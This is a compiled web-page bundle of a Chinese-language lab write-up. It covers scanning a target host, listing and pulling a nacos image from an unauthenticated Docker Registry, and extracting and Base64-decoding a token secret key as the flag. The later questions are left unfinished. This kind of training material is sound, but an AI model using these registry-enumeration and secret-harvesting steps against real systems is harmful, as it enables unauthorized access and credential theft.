"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8163],{29990:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>l,toc:()=>r});var s=t(85893),o=t(11151);const a={},c="\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2",l={id:"Xuanji/Unit-9/43",title:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2",description:"1",source:"@site/docs/Xuanji/Unit-9/43.md",sourceDirName:"Xuanji/Unit-9",slug:"/Xuanji/Unit-9/43",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-9/43",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-9/43.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-9/40"}},i={},r=[{value:"1",id:"1",level:2},{value:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",id:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",level:3},{value:"\u83b7\u53d6nacos\u955c\u50cf\u6570\u636e",id:"\u83b7\u53d6nacos\u955c\u50cf\u6570\u636e",level:3},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2}];function d(e){const n={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,o.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"\u7b2c\u4e5d\u7ae0---blueteam-\u7684\u5c0f\u5fc3\u601d-2",children:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2"}),"\n",(0,s.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"nacos \u7684 key \u4e3a\u591a\u5c11 flag{base64decodekey}"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a\u73af\u5883\u5e76\u4e0d\u662f\u5e38\u89c4\u7684\u4e0a\u673a\u8fdb\u884c\u5e94\u6025\u7684\u9898\u76ee\uff0c\u8fd9\u91cc\u9700\u8981\u5148\u5bf9\u9776\u673a\u8fdb\u884c\u6e17\u900f\u653b\u51fb"}),"\n",(0,s.jsx)(n.h3,{id:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",children:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"\u9700\u8981\u6ce8\u610f\uff0c\u73af\u5883\u542f\u52a8\u9700\u8981\u4e00\u5b9a\u65f6\u95f4\uff0c\u8bf7\u7a0d\u7b493\u5206\u949f\u5de6\u53f3\u518d\u5f00\u59cb\u626b\u63cf\u64cd\u4f5c"}),(0,s.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u5efa\u8bae\u4f7f\u7528\u4e91\u670d\u52a1\u5668\u8fdb\u884c\u626b\u63cf\uff0c\u6821\u56ed\u7f51\u548c\u6d41\u91cf\u70ed\u70b9\u90fd\u6709\u51fa\u73b0\u4e0d\u540c\u60c5\u51b5\u7684\u5e72\u6270"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="nmap"',children:'Nmap scan report for ec2-52-82-27-37.cn-northwest-1.compute.amazonaws.com.cn (52.82.27.37)\nHost is up, received echo-reply ttl 43 (0.053s latency).\nScanned at 2024-05-26 16:18:35 CST for 65s\nNot shown: 65520 closed ports\nReason: 65520 resets\nPORT     STATE    SERVICE          REASON         VERSION\n80/tcp   filtered http             no-response\n135/tcp  filtered msrpc            no-response\n136/tcp  filtered profile          no-response\n137/tcp  filtered netbios-ns       no-response\n138/tcp  filtered netbios-dgm      no-response\n139/tcp  filtered netbios-ssn      no-response\n443/tcp  filtered https            no-response\n445/tcp  filtered microsoft-ds     no-response\n593/tcp  filtered http-rpc-epmap   no-response\n2222/tcp open     ssh              syn-ack ttl 42 OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)\n| ssh-hostkey: \n|   2048 39:26:71:4c:4f:48:c1:4c:75:f5:2b:6e:1e:5f:a1:0d (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDScdsKvBjbOe7CjYm9G72Ew8uoxRv5tW1GnMJ9xBhddn61r7Q9EAhKl9a09tqfkc9PMHLrbg4sUFplCadSBATDcvTsazozoYto7NVuNoJD12R5O5VgoVDzzk29bID0gWoYcsGKuZjJ9BOJ/CDMHExkHq38wfisrUbAaPS27UM3e1DOKuGMDzi18BKsj1ZCOuqDio9jUjhh3xKxuWqPLkc12DLq4oSVOGMZOX85xj261BWoqgOwVTBmDt0FC+z0fiJlZYLs3xboqxWpIjUN70kDwJjOz1Oen/UX5mldViig4fcj337OQsOZhAfMez7BqtEOY7BcCI+lU9r5eg4zNuNv\n|   256 9b:38:86:a7:6c:e2:5b:43:0b:19:ae:05:71:54:7a:16 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmA2ukt6Jc8jLKDMZBNDcZnQBRsO+wQaiOUuyeQELgZNjpz4WuDSjw3mI6yNpwzySl5jt7sZ1A5muuSCNb6K0I=\n|   256 3b:42:08:0a:93:83:c1:97:08:50:d8:28:59:e4:27:23 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARiXHVhbRW2QY2h2UMG6ZJBsz8DmScnvoRpeqH79epF\n4444/tcp filtered krb524           no-response\n5000/tcp open     http             syn-ack ttl 41 Docker Registry (API: 2.0)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn\'t have a title.\n8080/tcp filtered http-proxy       no-response\n8082/tcp open     blackice-alerts? syn-ack ttl 41\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 \n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: application/json;charset=UTF-8\n|     Date: Sun, 26 May 2024 08:18:55 GMT\n|     Connection: close\n|     {"timestamp":"2024/05/26 16:18:55","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}\n|   GetRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=B7F3E564B8918E2D2C135099568E6B6F; Path=/; HttpOnly\n|     Location: http://localhost:8082/login.html\n|     Content-Length: 0\n|     Date: Sun, 26 May 2024 08:18:55 GMT\n|     Connection: close\n|   HTTPOptions: \n|     HTTP/1.1 200 \n|     Allow: GET,HEAD,POST,PUT,PATCH,DELETE,OPTIONS\n|     Content-Length: 0\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|_    Connection: close\n8848/tcp open     unknown          syn-ack ttl 40\n| fingerprint-strings: \n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 404 \n|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 \n|     Found</h1></body></html>\n|   RTSPRequest: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400 \n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 \n|_    Request</h1></body></html>\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\u83b7\u53d6nacos\u955c\u50cf\u6570\u636e",children:"\u83b7\u53d6nacos\u955c\u50cf\u6570\u636e"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u6709Docker Registry\u670d\u52a1\uff0c\u5c1d\u8bd5\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",metastring:'title="http://52.82.27.37:5000/v2/_catalog"',children:'{\n    "repositories": [\n        "nacos"\n    ]\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0\u5b58\u5728\u6709",(0,s.jsx)(n.code,{children:"nacos"}),"\u955c\u50cf\uff0c\u67e5\u770b\u955c\u50cf\u7684tags"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",metastring:'title="http://52.82.27.37:5000/v2/nacos/tags/list"',children:'{\n    "name": "nacos",\n    "tags": [\n        "latest"\n    ]\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u5c06\u955c\u50cf\u83b7\u53d6\u5230\u672c\u5730\uff0c\u9996\u5148\u9700\u8981\u6539\u5199\u672c\u5730docekr\u7684\u5b89\u5168\u7b56\u7565\uff0c\u5141\u8bb8http\u4e0d\u5b89\u5168\u7684\u6ce8\u518c\u8868"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",metastring:'title="/etc/docker/daemon.json"',children:'{\n    "insecure-registries" : [ "52.82.27.37:5000" ]\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u91cd\u542fdockerd"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"sudo systemctl daemon-reload\nsudo systemctl restart docker\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e0b\u8f7d\u955c\u50cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"randark@developer:~/temp$ docker pull 52.82.27.37:5000/nacos:latest\nlatest: Pulling from nacos\n2d473b07cdd5: Pull complete \n8e2e6bf0e569: Pull complete \nc7276c1c2105: Pull complete \n2694550f92f1: Pull complete \nb043b5656d6f: Pull complete \n103731dfc453: Pull complete \ne1dec0556439: Pull complete \n4f4fb700ef54: Pull complete \n48ba5d7d5cad: Pull complete \nDigest: sha256:42ea3485ea154fbbc6b6bd26f497f046b1355e888fc1792d87a143644945dfb8\nStatus: Downloaded newer image for 52.82.27.37:5000/nacos:latest\n52.82.27.37:5000/nacos:latest\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u57fa\u4e8e\u6b64\u955c\u50cf\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"randark@developer:~/temp$ docker run -d 52.82.27.37:5000/nacos\n85bc4f99c050386699c96560d65fd8150d88b4989d75158d8d23cc0b9e0955d9\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06vscode\u9644\u52a0\u8fdb\u6b64\u5bb9\u5668\uff0c\u5f00\u59cb\u5ba1\u8ba1"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(80937).Z+"",width:"2560",height:"1541"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728",(0,s.jsx)(n.code,{children:"/home/nacos"}),"\u76ee\u5f55\u4e0b\u542f\u52a8vscode\u8fdb\u884c\u5ba1\u8ba1\uff0c\u4ee5key\u4f5c\u4e3a\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u627e\u5230\u8fd9\u6761\u8bb0\u5f55"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/nacos/conf/application.properties"',children:"nacos.core.auth.plugin.nacos.token.secret.key=eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7ecf\u8fc7Base64\u89e3\u7801\u540e\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\nxjnacos2023penguinedisecflagflagflag\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{xjnacos2023penguinedisecflagflagflag}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"nacos\u914d\u7f6e\u6587\u4ef6\u7684 flag"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"TODO \u6253\u4e0d\u8fdb\u53bb\u4e86\uff0c\u78b0\u58c1ing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag"})}),"\n",(0,s.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag"})}),"\n",(0,s.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag"})})]})}function p(e={}){const{wrapper:n}={...(0,o.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},80937:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240547-164746-1aa594d837ede9e41b307a0692a2b947.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>l,a:()=>c});var s=t(67294);const o={},a=s.createContext(o);function c(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:c(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);